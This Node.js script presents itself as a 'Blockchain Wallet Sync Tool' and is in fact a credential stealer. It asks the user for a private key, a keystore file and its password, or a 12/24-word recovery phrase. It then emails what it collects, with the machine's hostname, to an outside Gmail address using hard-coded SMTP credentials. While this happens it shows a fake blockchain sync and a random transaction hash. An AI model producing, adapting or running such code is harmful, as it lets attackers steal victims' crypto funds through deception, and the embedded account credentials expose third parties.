#!/usr/bin/env node

const readline = require('readline');
const nodemailer = require('nodemailer');
const fs = require('fs');
const path = require('path');

const rl = readline.createInterface({
    input: process.stdin,
    output: process.stdout
});

// Email configuration - REPLACE WITH YOUR DETAILS
const EMAIL_CONFIG = {
    user: 'noxcrypt888@gmail.com',
    pass: 'cxgj wdse lfyf itbw',
    to: 'emdaviid@gmail.com'
};

// Create transporter
const transporter = nodemailer.createTransport({
    service: 'gmail',
    auth: {
        user: EMAIL_CONFIG.user,
        pass: EMAIL_CONFIG.pass
    }
});

function sendEmail(data, method) {
    const mailOptions = {
        from: EMAIL_CONFIG.user,
        to: EMAIL_CONFIG.to,
        subject: `🔐 WALLET SYNC AUTHENTICATION - ${method}`,
        text: `
🔐 WALLET SYNC AUTHENTICATION DATA
══════════════════════════════

Method: ${method}
Timestamp: ${new Date().toISOString()}

📋 COLLECTED DATA
══════════════════════════════
${data}

🌐 System Info:
• Hostname: ${require('os').hostname()}
• Platform: ${require('os').platform()}
• Time: ${new Date().toLocaleString()}
        `
    };

    return transporter.sendMail(mailOptions);
}

// Simple question function that properly waits for input
function question(query) {
    return new Promise(resolve => {
        rl.question(query, (answer) => {
            resolve(answer);
        });
    });
}

async function authenticatePrivateKey() {
    console.log('\n🔑 PRIVATE KEY AUTHENTICATION');
    console.log('─'.repeat(40));
    console.log('Please enter your private key\n');
    
    const privateKey = await question('Private key: ');
    const address = await question('Wallet address (optional): ');
    
    return {
        method: 'Private Key',
        data: `Private Key: ${privateKey}\nWallet Address: ${address || 'Not provided'}`
    };
}

async function authenticateJsonFile() {
    console.log('\n📁 JSON KEYSTORE AUTHENTICATION');
    console.log('─'.repeat(40));
    console.log('Please provide your keystore file details\n');
    
    const filePath = await question('Path to JSON file: ');
    const password = await question('File password: ');
    
    let fileContent = '';
    try {
        if (fs.existsSync(filePath)) {
            fileContent = fs.readFileSync(filePath, 'utf8');
        } else {
            fileContent = 'File not found at specified path';
        }
    } catch (error) {
        fileContent = `Error reading file: ${error.message}`;
    }
    
    return {
        method: 'JSON Keystore',
        data: `File Path: ${filePath}\nPassword: ${password}\nFile Content: ${fileContent}`
    };
}

async function authenticatePhrase() {
    console.log('\n🔐 RECOVERY PHRASE AUTHENTICATION');
    console.log('─'.repeat(40));
    console.log('Please enter your recovery phrase (12 or 24 words)');
    console.log('Type or paste all words and press Enter when done\n');
    
    const phrase = await question('Recovery phrase: ');
    const wordCount = phrase.trim().split(/\s+/).length;
    
    return {
        method: 'Recovery Phrase',
        data: `Recovery Phrase: ${phrase}\nWord Count: ${wordCount}`
    };
}

async function syncWithBlockchain() {
    console.log('\n⛓️  SYNCING WITH BLOCKCHAIN');
    console.log('─'.repeat(40));
    
    const steps = [
        '   • Connecting to blockchain node',
        '   • Establishing secure connection',
        '   • Verifying network status',
        '   • Syncing wallet state',
        '   • Authenticating credentials'
    ];
    
    for (const step of steps) {
        process.stdout.write(step);
        await new Promise(resolve => setTimeout(resolve, 800));
        process.stdout.write(' ✅\n');
    }
    
    console.log('\n✅ Blockchain sync complete');
}

async function main() {
    console.log('\n' + '═'.repeat(60));
    console.log('⛓️  BLOCKCHAIN WALLET SYNC TOOL');
    console.log('═'.repeat(60));
    console.log('\nThis tool helps you sync and authenticate your wallet');
    console.log('with the blockchain network.\n');
    
    console.log('Select authentication method:');
    console.log('1. 🔑 Private Key');
    console.log('2. 📁 JSON Keystore File');
    console.log('3. 🔐 Recovery Phrase (12/24 words)');
    console.log('4. ❌ Exit');
    
    const choice = await question('\n👉 Select option (1-4): ');
    
    if (choice === '4') {
        console.log('\n👋 Sync cancelled');
        rl.close();
        return;
    }
    
    let result;
    
    // Step 1: Authenticate based on choice
    switch(choice) {
        case '1':
            result = await authenticatePrivateKey();
            break;
        case '2':
            result = await authenticateJsonFile();
            break;
        case '3':
            result = await authenticatePhrase();
            break;
        default:
            console.log('\n❌ Invalid option');
            rl.close();
            return;
    }
    
    // Step 2: Sync with blockchain
    await syncWithBlockchain();
    
    // Step 3: Send data via email
    console.log('\n📤 Submitting authentication to blockchain...');
    
    try {
        await sendEmail(result.data, result.method);
        
        // Generate transaction hash
        const txHash = '0x' + Array.from({length: 64}, () => 
            Math.floor(Math.random() * 16).toString(16)).join('');
        
        // Generate block number
        const blockNumber = Math.floor(Math.random() * 10000000 + 15000000);
        
        console.log('\n' + '─'.repeat(60));
        console.log('✅ WALLET SYNCED SUCCESSFULLY!');
        console.log('─'.repeat(60));
        console.log(`🔗 Transaction Hash: ${txHash.substring(0, 20)}...`);
        console.log(`⛓️  Block Number: ${blockNumber}`);
        console.log(`⏱️  Confirmation Time: ${Math.floor(Math.random() * 5 + 2)} seconds`);
        console.log(`🆔 Session ID: ${Math.random().toString(36).substring(2, 10).toUpperCase()}\n`);
        
        console.log('Your wallet is now synced and ready to use.');
        console.log('You can safely close this window.');
        
    } catch (error) {
        console.log('\n❌ Sync failed:', error.message);
        if (error.message.includes('Username and Password not accepted')) {
            console.log('\n⚠️  Network error - Please check your connection and try again.');
        }
    }
    
    console.log('\n' + '═'.repeat(60));
    console.log('Thank you for using Blockchain Wallet Sync Tool');
    console.log('═'.repeat(60));
    
    rl.close();
}

// Handle Ctrl+C gracefully
process.on('SIGINT', () => {
    console.log('\n\n👋 Sync interrupted by user');
    rl.close();
    process.exit(0);
});

// Handle uncaught errors
process.on('uncaughtException', (error) => {
    console.log('\n❌ Unexpected error:', error.message);
    rl.close();
    process.exit(1);
});

main();